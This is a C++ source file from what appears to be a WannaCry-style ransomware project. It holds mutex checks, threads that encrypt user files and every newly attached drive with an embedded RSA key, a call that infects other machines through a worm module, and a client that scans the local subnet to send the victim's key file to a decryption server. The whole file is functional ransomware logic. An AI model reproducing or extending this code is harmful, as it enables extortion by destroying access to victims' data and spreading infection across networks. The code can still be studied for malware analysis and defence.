#include "../config.h"
#include "../Common/socktool.h"
#include "WanaEncryptor.h"
#include "../EZCrypt/EZRSA.h"
#include "WanaFile.h"
#include "WanaProc.h"
#include "../Worm/WormProc.h"
#include "keys.h"
#include <Windows.h>
#include <time.h>
#include <stdio.h>
BOOL CheckEncryptorMutex(LPCTSTR pName)
{
	HANDLE hMutex = CreateMutex(NULL, TRUE, pName);
	if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
		CloseHandle(hMutex);
		return TRUE;
	}
	return FALSE;
}

INT CreateEncryptorMutex(INT n)
{
	TCHAR szName[MAX_PATH];
	HANDLE hMutex = OpenMutex(
		SYNCHRONIZE,
		TRUE,
		_T("Global\\MsWinZonesCacheCounterMutexW"));
	if (hMutex) {
		CloseHandle(hMutex);
		return 1;
	}
	else {
		_stprintf_s(szName, _T("%s%d"),
			MUTEX_NAME, n);
		hMutex = CreateMutex(
			NULL,
			TRUE,
			szName);
		if (hMutex && GetLastError()
			== ERROR_ALREADY_EXISTS) {
			CloseHandle(hMutex);
			return 1;
		}
		else {
			return 0;
		}
	}
	return 0;
}

BOOL CheckDKYFileValid()
{
	TCHAR szPkyFile[MAX_PATH];
	TCHAR szDkyFile[MAX_PATH];
	GetPkyFileName(szPkyFile);
	GetDkyFileName(szDkyFile);
	BOOL flag = RSAFileMatch(szPkyFile, szDkyFile);
	return SetDecryptFlag(flag);
}


////////////
// Threads
////////////

DWORD WINAPI CheckDKYThread(void)
{
	if (!CheckDKYFileValid()) {
		while (!(CheckDKYFileValid())) {
			Sleep(5000);
		}
		MessageBox(NULL,
			_T("Decryption Key is AVAILABLE now"),
			_T("Congratulations"),
			MB_OK);
	}
	ExitThread(0);
}


DWORD WINAPI DriveMonitorThread(void)
{
	DWORD LastDrives = 0;
	DWORD CurrentDrives = 0;
	TCHAR szRootPathName[16] = ENCRYPT_ROOT_PATH;
	PWanaCryptor pCryptor = NULL;
	pCryptor = new WanaCryptor(
		WannaPublicKey(),
		WannaPublicKeySize());
	while (!GetDecryptFlag()) {
		Sleep(3000);
		DEBUG("DecryptMode: %d\n", GetDecryptFlag());
		LastDrives = CurrentDrives;
		CurrentDrives = GetLogicalDrives();
		DEBUG("CurrentDrives: %d, last: %d\n",
			CurrentDrives, LastDrives);
		if (CurrentDrives != LastDrives) {
			for (int DiskNO = 0;
				DiskNO < 26 && !GetDecryptFlag();
				DiskNO++) {
				szRootPathName[0] = DiskNO + 65;
				CurrentDrives = GetLogicalDrives();
				if ((CurrentDrives >> DiskNO) & 1 &&
					!((LastDrives >> DiskNO) & 1)) {
					if (GetFileAttributes(szRootPathName) !=
						INVALID_FILE_ATTRIBUTES) {
						DEBUG("Monitor: encrypt %s\n",
							szRootPathName);
						pCryptor->Encrypt(szRootPathName);
					}
					else {
						DEBUG("Monitor: %s not found\n",
							szRootPathName);
					}
				}
			}
		}
	}
	delete pCryptor;
	pCryptor = NULL;
	ExitThread(0);
}

DWORD WINAPI UpdateResFileThread(void)
{
	RESDATA ResData;
	ReadResFile(&ResData);
	while (!GetDecryptFlag()) {
		if (!ResData.m_StartTime) {
			ResData.m_StartTime = (DWORD)time(NULL);
		}
		ResData.m_EndTime = (DWORD)time(NULL);
		WriteResFile(&ResData);
		Sleep(25000);
	}
	ExitThread(0);
}

BOOL DecryptClient(HWND hWnd)
{
	CHAR ip[32];
	INT i1, i2, i3, i4;
	WSADATA wsaData;
	BOOL iResult;
	BOOL fDecryptFlag = FALSE;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("client: WSAStartup failed with error: %d\n",
			iResult);
		return FALSE;
	}
	GetLocalIP(ip, sizeof(ip));
	sscanf_s(ip, "%d.%d.%d.%d", &i1, &i2, &i3, &i4);
	for (INT i = 1; i < 255; i++) {
		if (!fDecryptFlag) {
			sprintf_s(ip, sizeof(ip),
				"%d.%d.%d.%d", i1, i2, i3, i);
			SOCKET s = CreateSocket(
				ip,	DECRYPT_SERVER_PORT,
				DEFAULT_CONNECT_TIMEOUT);
			if (s != INVALID_SOCKET) {
				UCHAR abBuffer[4096];
				DWORD cbBuffer;
				DWORD cbResult;
				ReadEkyFile(
					abBuffer,
					sizeof(abBuffer),
					&cbBuffer);
				SendAll(s, (PCHAR)abBuffer, cbBuffer, 0);
				shutdown(s, SD_SEND);
				cbBuffer = RecvAll(
					s,
					(PCHAR)abBuffer,
					sizeof(abBuffer),
					0);
				closesocket(s);
				if (cbBuffer > 0) {
					WriteDkyFile(
						abBuffer,
						cbBuffer,
						&cbResult);
					if (cbBuffer == cbResult) {
						fDecryptFlag = TRUE;
					}
				}
				if (hWnd) {
					SendMessage(hWnd, WM_USER, IDC_SCAN_FOUND, i);
				}
			}
		}
		if (hWnd) {
			SendMessage(hWnd, WM_USER, IDC_SCAN_SERVER, i);
		}
	}
	WSACleanup();
	return TRUE;
}

DWORD WINAPI DecryptClientThread(LPVOID lpParameter)
{
	HWND hWnd = (HWND)lpParameter;
	BOOL iResult = DecryptClient(hWnd);
	if (hWnd) {
		SendMessage(hWnd, WM_USER, IDC_SCAN_DONE, 0);
	}
	ExitThread(iResult);
}

BOOL StartEncryptor(void)
{
	if (CreateEncryptorMutex(0) != 0) {
		return FALSE;
	}

	// Infect other machines
	Infect(NULL);
	// Thread to check DKY file
	HANDLE hThread;
	hThread = CreateThread(
		0,
		0,
		(LPTHREAD_START_ROUTINE)CheckDKYThread,
		NULL,
		0,
		0);
	if (hThread) {
		CloseHandle(hThread);
		hThread = NULL;
	}
	Sleep(100);
	// Thread to update RES file
	hThread = CreateThread(
		0,
		0,
		(LPTHREAD_START_ROUTINE)UpdateResFileThread,
		NULL,
		0,
		0);
	if (hThread) {
		CloseHandle(hThread);
		hThread = NULL;
	}
	Sleep(100);
	// Encrypt User Files
	PWanaCryptor pCryptor = new WanaCryptor(
		WannaPublicKey(),
		WannaPublicKeySize());
	pCryptor->EncryptUsers();
	pCryptor->Encrypt(ENCRYPT_ROOT_PATH);
	delete pCryptor;
	// Thread to monitor drives
	hThread = CreateThread(
		0,
		0,
		(LPTHREAD_START_ROUTINE)DriveMonitorThread,
		NULL,
		0,
		0);
	if (hThread) {
		CloseHandle(hThread);
		hThread = NULL;
	}
	return TRUE;
}